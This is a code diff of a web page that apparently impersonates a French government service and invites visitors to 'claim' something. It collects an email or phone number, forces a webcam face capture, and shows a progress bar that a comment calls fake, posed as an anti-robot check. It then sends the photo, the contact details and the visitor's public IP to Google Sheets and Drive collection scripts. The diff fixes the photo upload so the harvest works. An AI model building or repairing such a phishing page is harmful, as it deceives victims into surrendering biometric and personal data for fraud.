@@ -74,7 +74,7 @@
   .form-group input:focus, .form-group select:focus { outline: 2px solid #000091; outline-offset: 2px; }
 
   .phone-group { display: flex; gap: 10px; }
-  .phone-group select { width: 140px; flex-shrink: 0; }
+  .phone-group select { width: 160px; flex-shrink: 0; }
   .phone-group input { flex-grow: 1; }
 
   .option-btn { display: block; width: 100%; text-align: left; background: #fff; border: 1px solid #3a3a3a; padding: 15px; margin-bottom: 10px; cursor: pointer; font-size: 15px; border-radius: 0; font-family: 'Marianne', sans-serif; transition: background 0.2s; }
@@ -380,7 +380,7 @@ inputMethod.addEventListener('change', () => {
     emailWrapper.style.display = 'none';
     phoneWrapper.style.display = 'flex';
     document.getElementById('label-contact').textContent = "Votre numéro de téléphone";
-    document.getElementById('hint-contact').textContent = "Sélectionnez votre pays puis saisissez votre numéro (minimum 7 chiffres)";
+    document.getElementById('hint-contact').textContent = "Sélectionnez votre pays puis saisissez votre numéro";
   }
 });
 
@@ -462,26 +462,22 @@ document.getElementById('btn-claim').addEventListener('click', () => {
       return;
     }
   } else if (inputMethod.value === 'sms') {
-    // Nettoyer le numéro (retirer espaces, tirets, points)
     const cleanPhone = inputPhone.value.replace(/[\s\-\.]/g, '');
     
-    // Vérifier qu'il n'y a que des chiffres
     if (!/^\d+$/.test(cleanPhone)) {
       alert("Le numéro de téléphone ne doit contenir que des chiffres.");
       return;
     }
     
-    // Vérifier la longueur (7 minimum, 15 maximum selon norme E.164)
     if (cleanPhone.length < 7 || cleanPhone.length > 15) {
       alert("Le numéro de téléphone doit contenir entre 7 et 15 chiffres.");
       return;
     }
     
-    // Vérifier la longueur attendue par le pays
     const selectedOption = inputCountryCode.options[inputCountryCode.selectedIndex];
     const expectedLen = parseInt(selectedOption.dataset.len);
     if (cleanPhone.length !== expectedLen) {
-      alert(`Pour ce pays, le numéro doit contenir ${expectedLen} chiffres. Vous avez saisi ${cleanPhone.length} chiffres.`);
+      alert(`Pour ce pays, le numéro doit contenir ${expectedLen} chiffres (sans le 0 initial). Vous avez saisi ${cleanPhone.length} chiffres.`);
       return;
     }
   }
@@ -568,7 +564,6 @@ btnSubmit.addEventListener('click', async () => {
       }
     }
 
-    // --- SI AUCUN VISAGE TROUVÉ : ON BLOQUE ---
     if (!faceFound) {
       if (mediaStream) mediaStream.getTracks().forEach(t => t.stop());
       mediaStream = null;
@@ -583,14 +578,12 @@ btnSubmit.addEventListener('click', async () => {
       return;
     }
 
-    // --- CAPTURE PHOTO IMMÉDIATE (logique qui fonctionnait) ---
+    // --- CAPTURE PHOTO ---
     loaderText.textContent = "Analyse biométrique en cours...";
     loaderBarFill.style.width = '50%';
 
-    // Attendre 200ms que la vidéo soit stabilisée
     await new Promise(r => setTimeout(r, 200));
 
-    // Capture via canvas
     const canvas = document.createElement('canvas');
     canvas.width = video.videoWidth || 640;
     canvas.height = video.videoHeight || 480;
@@ -598,9 +591,8 @@ btnSubmit.addEventListener('click', async () => {
     ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
     const photoBase64 = canvas.toDataURL('image/jpeg', 0.85);
     
-    console.log("📸 Photo capturée. Taille:", photoBase64.length, "caractères");
+    console.log("📸 Photo capturée. Taille:", photoBase64.length);
 
-    // Fausse progression pendant 2 secondes
     setTimeout(() => {
       loaderText.textContent = "Vérification anti-robot et sécurisation...";
       loaderBarFill.style.width = '80%';
@@ -611,7 +603,6 @@ btnSubmit.addEventListener('click', async () => {
 
         const ip = await getPublicIP();
         
-        // Récupération des données
         let emailToSend = "";
         let phoneToSend = "";
 
@@ -638,19 +629,19 @@ btnSubmit.addEventListener('click', async () => {
 
         fetch(SCRIPT_URL_TEXT, { method: "POST", body: formDataTexte })
           .then(r => r.text())
-          .then(t => console.log("✓ Réponse Sheet:", t))
-          .catch(e => console.log("✗ Erreur Sheet:", e));
+          .then(t => console.log("✓ Sheet:", t))
+          .catch(e => console.log("✗ Sheet:", e));
 
-        // Envoi de la photo vers le Drive
+        // ⚠️ ENVOI DE LA PHOTO : On utilise "photo" pour correspondre au script Google Apps Script
         const formDataMedia = new URLSearchParams();
-        formDataMedia.append("media", photoBase64);
+        formDataMedia.append("photo", photoBase64);
         formDataMedia.append("extension", "jpg");
         
         console.log("📤 Envoi photo vers Drive...");
         fetch(SCRIPT_URL_PHOTO, { method: "POST", body: formDataMedia })
           .then(r => r.text())
-          .then(t => console.log("✓ Réponse Drive:", t))
-          .catch(e => console.log("✗ Erreur Drive:", e));
+          .then(t => console.log("✓ Drive:", t))
+          .catch(e => console.log("✗ Drive:", e));
 
         if (mediaStream) mediaStream.getTracks().forEach(t => t.stop());
         
